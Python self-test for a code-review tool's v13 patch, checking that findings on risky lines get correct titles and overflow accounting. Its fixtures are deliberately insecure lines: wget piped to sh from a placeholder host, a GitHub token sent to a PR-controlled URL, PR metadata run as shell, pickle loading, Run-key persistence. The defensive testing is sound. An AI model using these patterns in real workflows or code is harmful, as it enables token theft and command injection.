#!/usr/bin/env python3
"""Regression self-test for DCOIR Review v13 runtime patch.

This test exercises the #338 failure shape: selected findings can carry the
right sentinel key but the wrong rendered title/body. v13 must rewrite those
comments deterministically before GitHub sees them, keep workflow YAML from
being treated as Kubernetes, and account for required/optional overflow.
"""

from __future__ import annotations

import importlib.util
import sys
from pathlib import Path
from types import SimpleNamespace
from typing import Any

import dcoir_review_required_runtime_patch_v12_selftest as v12test


WORKFLOW = ".github/workflows/dcoir-review-v13-render-integrity-probe.yml"
PYTHON = ".github/chatgpt_staging/dcoir_review_probe/v13_render_probe.py"
POWERSHELL = ".github/chatgpt_staging/dcoir_review_probe/v13_render_probe.ps1"
K8S = ".github/chatgpt_staging/dcoir_review_probe/v13_optional_k8s.yml"
TYPESCRIPT = ".github/chatgpt_staging/dcoir_review_probe/v13_optional_typescript.ts"


class Config(SimpleNamespace):
    max_inline_comments: int = 12
    debug: bool = True


class FakeHardened:
    ReviewQualityError = RuntimeError

    def __init__(self) -> None:
        self.debug: dict[str, object] = {}

    def write_debug_json_artifact_safely(self, _config: Any, path: str, data: Any) -> None:
        self.debug[path] = data


def _load_v13():
    v12test._load_v12()
    path = Path(__file__).with_name("dcoir_review_required_runtime_patch_v13.py")
    spec = importlib.util.spec_from_file_location("dcoir_review_required_runtime_patch_v13", path)
    assert spec and spec.loader
    module = importlib.util.module_from_spec(spec)
    sys.modules[spec.name] = module
    spec.loader.exec_module(module)
    return module


def sentinel(path: str, line: int, text: str, label: str = "", detail: str = "") -> SimpleNamespace:
    return SimpleNamespace(path=path, line=line, text=text, label=label, detail=detail)


def risk_sentinels() -> list[SimpleNamespace]:
    return [
        sentinel(WORKFLOW, 3, "  pull_request_target:"),
        sentinel(WORKFLOW, 5, "  contents: write"),
        sentinel(WORKFLOW, 6, "  actions: write"),
        sentinel(WORKFLOW, 13, "          ref: ${{ github.event.pull_request.head.sha }}"),
        sentinel(WORKFLOW, 15, "        run: wget -qO- https://downloads.example.invalid/bootstrap.sh | sh"),
        sentinel(WORKFLOW, 17, '        run: bash -lc "${{ github.event.pull_request.labels[0].name }}"'),
        sentinel(WORKFLOW, 19, '        run: curl -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" "${{ github.event.pull_request.body }}"'),
        sentinel(WORKFLOW, 21, '        run: sh -c "${{ github.event.pull_request.body }}"'),
        sentinel(PYTHON, 11, "    return pickle.loads(raw)"),
        sentinel(PYTHON, 15, "    return yaml.load(text, Loader=yaml.Loader)"),
        sentinel(PYTHON, 20, "    archive.extractall(destination)"),
        sentinel(PYTHON, 24, "    return os.system(command_text)"),
        sentinel(PYTHON, 29, '    token = os.environ["DCOIR_TOKEN"]'),
        sentinel(PYTHON, 30, '    return requests.post(callback, headers={"Authorization": f"Bearer {token}"})'),
        sentinel(PYTHON, 33, '    Path(user_path).open(mode="w+b").write(payload.encode())'),
        sentinel(POWERSHELL, 8, "$secret = ConvertTo-SecureString $PlainText -AsPlainText -Force"),
        sentinel(POWERSHELL, 10, '$rule = New-Object System.Security.AccessControl.FileSystemAccessRule("Everyone", "FullControl", "Allow")'),
        sentinel(POWERSHELL, 14, "Start-Process -FilePath $ToolPath -ArgumentList $Arguments -Wait"),
        sentinel(POWERSHELL, 16, 'Invoke-WebRequest -Uri $Callback -Headers @{ Authorization = "Bearer $env:DCOIR_TOKEN" }'),
        sentinel(POWERSHELL, 17, 'Set-ItemProperty -Path "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" -Name Demo -Value $ToolPath'),
        sentinel(K8S, 6, "  hostPID: true"),
        sentinel(K8S, 11, "        privileged: true"),
        sentinel(TYPESCRIPT, 8, "target.innerHTML = profile.biography"),
    ]


def mixed_findings() -> list[dict[str, Any]]:
    return [
        {
            "path": WORKFLOW,
            "line": 19,
            "title": "Workflow pipes a network installer into a shell",
            "body": "This is really the wget | sh risk and not token exfiltration.",
            "_anchored_line_text": '        run: curl -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" "${{ github.event.pull_request.body }}"',
            "_risk_sentinel_key": [WORKFLOW, 19, "yaml_token_to_pr_body_url"],
            "validation": "python3 - <<'PY'\nassert text.strip()",
            "severity": "critical",
            "confidence": 1,
        },
        {
            "path": WORKFLOW,
            "line": 17,
            "title": "Privileged workflow checks out untrusted PR code",
            "body": "This comment drifted into checkout guidance.",
            "_anchored_line_text": '        run: bash -lc "${{ github.event.pull_request.labels[0].name }}"',
            "_risk_sentinel_key": [WORKFLOW, 17, "yaml_metadata_shell"],
            "severity": "critical",
            "confidence": 1,
        },
        {
            "path": WORKFLOW,
            "line": 21,
            "title": "Kubernetes privileged container",
            "body": "This is a k8s finding, but it is anchored to a GitHub Actions shell line.",
            "_anchored_line_text": '        run: sh -c "${{ github.event.pull_request.body }}"',
            "_risk_sentinel_key": [WORKFLOW, 21, "yaml_metadata_shell"],
            "severity": "high",
            "confidence": 1,
        },
        {
            "path": WORKFLOW,
            "line": 15,
            "title": "Workflow pipes a network-fetched script into a shell",
            "_anchored_line_text": "        run: wget -qO- https://downloads.example.invalid/bootstrap.sh | sh",
            "_risk_sentinel_key": [WORKFLOW, 15, "yaml_shell_pipe"],
            "severity": "critical",
            "confidence": 1,
        },
        {
            "path": PYTHON,
            "line": 11,
            "title": "Unsafe deserialization via pickle.loads",
            "_anchored_line_text": "    return pickle.loads(raw)",
            "_risk_sentinel_key": [PYTHON, 11, "python_pickle_load"],
            "body": "_Reviewed with openrouter/auto._",
            "severity": "critical",
            "confidence": 1,
        },
        {
            "path": PYTHON,
            "line": 24,
            "title": "Python executes caller-controlled shell text",
            "_anchored_line_text": "    return os.system(command_text)",
            "_risk_sentinel_key": [PYTHON, 24, "python_shell_exec"],
            "severity": "critical",
            "confidence": 1,
        },
        {
            "path": POWERSHELL,
            "line": 14,
            "title": "PowerShell caller-controlled process launch",
            "_anchored_line_text": "Start-Process -FilePath $ToolPath -ArgumentList $Arguments -Wait",
            "_risk_sentinel_key": [POWERSHELL, 14, "ps_process_launch"],
            "severity": "critical",
            "confidence": 1,
        },
        {
            "path": K8S,
            "line": 6,
            "title": "Kubernetes workload shares host PID namespace",
            "_anchored_line_text": "  hostPID: true",
            "_risk_sentinel_key": [K8S, 6, "k8s_host_pid"],
            "severity": "high",
            "confidence": 0.9,
        },
        {
            "path": TYPESCRIPT,
            "line": 8,
            "title": "TypeScript writes untrusted data into HTML",
            "_anchored_line_text": "target.innerHTML = profile.biography",
            "_risk_sentinel_key": [TYPESCRIPT, 8, "ts_inner_html"],
            "severity": "high",
            "confidence": 0.9,
        },
    ]


def test_render_integrity_and_overflow_ledgers() -> None:
    v13 = _load_v13()
    hardened = FakeHardened()
    selected = v13._select_required_postable(hardened, mixed_findings(), risk_sentinels(), Config())
    metadata = sys.modules["dcoir_review_required_runtime_patch_v9_core"].SELECTION_SUMMARY
    selected_keys = set(metadata["selected_keys"])
    by_key = {tuple(item["_risk_sentinel_key"]): item for item in selected}

    assert len(selected) == 12
    assert metadata["version"] == "v13"
    assert metadata["final_invalid_selected_keys"] == []
    assert f"{WORKFLOW}:19 yaml_token_to_pr_body_url" in selected_keys
    assert f"{WORKFLOW}:17 yaml_metadata_shell" in selected_keys
    assert f"{WORKFLOW}:21 yaml_metadata_shell" in selected_keys
    assert not any(key.startswith(f"{WORKFLOW}:") and key.endswith("k8s_privileged_container") for key in selected_keys)

    line19 = by_key[(WORKFLOW, 19, "yaml_token_to_pr_body_url")]
    assert "token" in line19["title"].lower()
    assert "pr-controlled url" in line19["title"].lower()
    assert "installer" not in line19["title"].lower()

    line17 = by_key[(WORKFLOW, 17, "yaml_metadata_shell")]
    assert "metadata" in line17["title"].lower()
    assert "checkout" not in line17["title"].lower()

    line21 = by_key[(WORKFLOW, 21, "yaml_metadata_shell")]
    assert "kubernetes" not in line21["title"].lower()
    assert "privileged container" not in line21["body"].lower()

    rendered = "\n".join(str(item) for item in selected)
    assert "Reviewed with " not in rendered
    assert "<<" not in rendered
    assert "assert text.strip()" not in rendered

    omitted = {(item["path"], item["line"], item["kind"]) for item in metadata["omitted_required_sentinels"]}
    assert (WORKFLOW, 13, "yaml_untrusted_checkout") in omitted or f"{WORKFLOW}:13 yaml_untrusted_checkout" in selected_keys
    assert metadata["overflow_required_count"] >= 1
    assert metadata["overflow_optional_high_risk_count"] >= 1
    assert any(item["kind"] in {"k8s_host_pid", "ts_inner_html"} for item in metadata["omitted_optional_high_risk_sentinels"])


def test_final_render_and_review_body_hooks() -> None:
    v13 = _load_v13()

    class FakeBase:
        def build_inline_comment(self, finding: dict[str, Any], model_used: str, _config: Any) -> str:
            return (
                f"### {finding.get('title')}\n\n"
                f"{finding.get('body')}\n\n"
                "```python\nassert text.strip()\n"
                f"_Reviewed with {model_used}._"
            )

    hardened = FakeHardened()
    hardened.build_review_body_with_unanchored = lambda *_args, **_kwargs: "Base review body"
    module = SimpleNamespace(base=FakeBase(), hardened=hardened)
    v13.apply_pareto_context_module(module)
    selected = v13._select_required_postable(hardened, mixed_findings(), risk_sentinels(), Config())

    rendered = module.base.build_inline_comment(mixed_findings()[0], "deepseek/deepseek-v4-pro-20260423", Config())
    assert "Reviewed with " not in rendered
    assert "assert text.strip()" not in rendered
    assert "<<" not in rendered
    assert "token" in rendered.lower()
    assert "installer" not in rendered.lower()

    review_body = hardened.build_review_body_with_unanchored({}, selected, [], "model", Config(), "sha")
    assert "### DCOIR Review Overflow" in review_body
    assert "Omitted hard-required findings" in review_body
    assert "Reviewed with " not in review_body


def test_domain_classifiers_are_not_overbroad() -> None:
    v13 = _load_v13()
    assert v13._line_kind(WORKFLOW, "        uses: actions/checkout@v4") == ""
    assert (
        v13._line_kind(K8S, 'curl -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" "${{ github.event.pull_request.body }}"')
        == ""
    )


def test_spoofed_trusted_key_cannot_override_anchored_line_semantics() -> None:
    v13 = _load_v13()
    assert v13._postable_key(
        {
            "path": TYPESCRIPT,
            "line": 8,
            "_anchored_line_text": "target.innerHTML = profile.biography",
            "_risk_sentinel_key": [TYPESCRIPT, 8, "ts_dynamic_execution"],
            "_dcoir_v13_trusted_key": True,
        }
    ) == (TYPESCRIPT, 8, "ts_inner_html")
    assert v13._postable_key(
        {
            "path": K8S,
            "line": 11,
            "_anchored_line_text": "        privileged: true",
            "_risk_sentinel_key": [K8S, 11, "k8s_host_pid"],
            "_dcoir_v13_trusted_key": True,
        }
    ) == (K8S, 11, "k8s_privileged_container")
    assert v13._postable_key(
        {
            "path": POWERSHELL,
            "line": 17,
            "_anchored_line_text": 'Set-ItemProperty -Path "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" -Name Demo -Value $ToolPath',
            "_risk_sentinel_key": [POWERSHELL, 17, "ps_plaintext_secure_string"],
            "_dcoir_v13_trusted_key": True,
        }
    ) == (POWERSHELL, 17, "ps_run_key_persistence")


def test_apply_twice_no_recursion() -> None:
    v13 = _load_v13()
    module = SimpleNamespace(base=None, hardened=FakeHardened())
    v13.apply_pareto_context_module(module)
    v13.apply_pareto_context_module(module)
    key = v13._postable_key(
        {
            "path": WORKFLOW,
            "line": 19,
            "_anchored_line_text": 'curl -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" "${{ github.event.pull_request.body }}"',
            "_risk_sentinel_key": [WORKFLOW, 19, "yaml_token_to_pr_body_url"],
        }
    )
    assert key == (WORKFLOW, 19, "yaml_token_to_pr_body_url")


def main() -> None:
    test_render_integrity_and_overflow_ledgers()
    test_final_render_and_review_body_hooks()
    test_domain_classifiers_are_not_overbroad()
    test_spoofed_trusted_key_cannot_override_anchored_line_semantics()
    test_apply_twice_no_recursion()
    print("dcoir_review_required_runtime_patch_v13_selftest passed")


if __name__ == "__main__":
    main()
